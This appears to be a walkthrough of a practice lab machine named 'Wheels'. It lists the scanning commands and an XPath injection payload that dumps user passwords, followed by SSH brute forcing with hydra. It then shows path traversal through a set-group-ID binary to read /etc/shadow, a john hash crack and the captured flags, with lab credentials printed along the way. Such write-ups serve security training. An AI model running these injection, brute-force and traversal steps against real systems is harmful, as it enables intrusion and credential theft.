@@ -1,0 +1,136 @@
+																							              Wheels Walkthrough
+																							
+Key points learned:   
+XPATH Injection
+Binary input exploitation
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.202
+export IP=192.168.214.202
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+2. nmap -Pn -n -sC -sV -p22,80 $IP --open --stats-every=5s -oN results.txt
+ 
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)                                                                              
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux;
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000 
+ <!-- nothing -->
+ 
+ 
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+
+/css/
+/img/
+/js/
+/lib/
+
+
+nikto --url $IP 
+
+
+Enumeration
+
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,429 -t 30 -R3 "http://$IP/FUZZ"   
+ <!-- nothing -->
+
+assets                                                                                                                          
+css                                                                                                                          
+index.html                                                                                                                        
+img                                                                                                                           
+js                                                                                                                              
+lib 
+
+ffuf -c -w /usr/share/wordlists/last_resort.txt -u http://$IP/FUZZ -t 500 -mc 200,301   
+<!-- nothing -->
+
+
+Try to register a new user, but aparently we don't have access to the Employee portal. Let's try to obtain those rights by registering a new user using the same domain for the email address. (info@wheels.service)
+
+Name: test1
+email: test@wheels.service
+Password: 1234
+
+Aparently we can access not the portal.
+We can search or filter users by services and we notice that the work parameter is injectable using XPATH.
+
+Usernames:
+Now that we've actually learned what XPATH is, we can use our common wordlist to brute-force that parameter
+
+We can use a basic sql injection payload list from seclists, Quick_SQli.txt to discover all usernames present within the application.
+
+dan
+alex
+selene
+bob
+alice
+john
+
+Passwords:
+We find that the payload ')]%2fpassword%00 ( ')]/password%00 ) work and all users passwords are displayed.
+
+Iamrockinginmyroom1212
+iamarabbitholeand7875
+johnloveseverontr8932
+lokieismyfav!@#12
+alreadydead$%^234
+lasagama90809!@
+
+Let's try SSH to see if it works.
+
+hydra -L users.txt -P pass $IP ssh -s 22 -e nsr -I
+
+bob   Iamrockinginmyroom1212    // We're in!       Flag:  2e4faa293127ce5ba8a307807069416f
+
+
+Privilege Escalation
+
+cd /var/www/html 
+cat config.php
+
+define('USER', 'wheels');
+    define('PASSWORD', 'CanRipperCrackthis?09');
+    define('HOST', 'localhost');
+    define('DATABASE', 'wheels');
+    
+mysql -uwheels -pCanRipperCrackthis?09   
+    
+gurana   | $2y$10$Im2ZQH9neNAUuM1LeUcNO.Hu.9p1qP2lQw59OtZKB.tmPrpRXoKmi  // dead end
+
+
+GUID
+find / -perm -g=s -type f 2>/dev/null
+
+/opt/get-list
+
+Aparently, it's a binary that allows your to specify which file do you want to open to read from a specific list : customers/employees
+
+BUt aparently, the binary only cares if one of the words is included in the command and not the command itself, so let's try to insert an additional file name to be read
+
+./get-list
+Which List do you want to open? [customers/employees]: ../../etc/shadow customers               // aparently we need to get out of the search directory
+Opening File....
+
+root:$6$Hk74of.if9klVVcS$EwLAljc7.DOnqZqVOTC0dTa0bRd2ZzyapjBnEN8tgDGrR9ceWViHVtu6gSR.L/WTG398zZCqQiX7DP/1db3MF0:19123:0:99999:7:::
+daemon:*:18474:0:99999:7:::
+bin:*:18474:0:99999:7:::
+
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+highschoolmusical (root) 
+
+su root
+password: highschoolmusical
+cd /root
+cat proof.txt        Flag:  4dd759bbfcb9d9101a8034720fda0a03
+
+/opt/get-list (Unknown SUID binary!) 
+
+ Searching passwords in config PHP files
+/var/www/html/config.php:    define('DATABASE', 'wheels');                                                                                                                                                           
+/var/www/html/config.php:    define('PASSWORD', 'CanRipperCrackthis?09');
+/var/www/html/config.php:    define('USER', 'wheels');
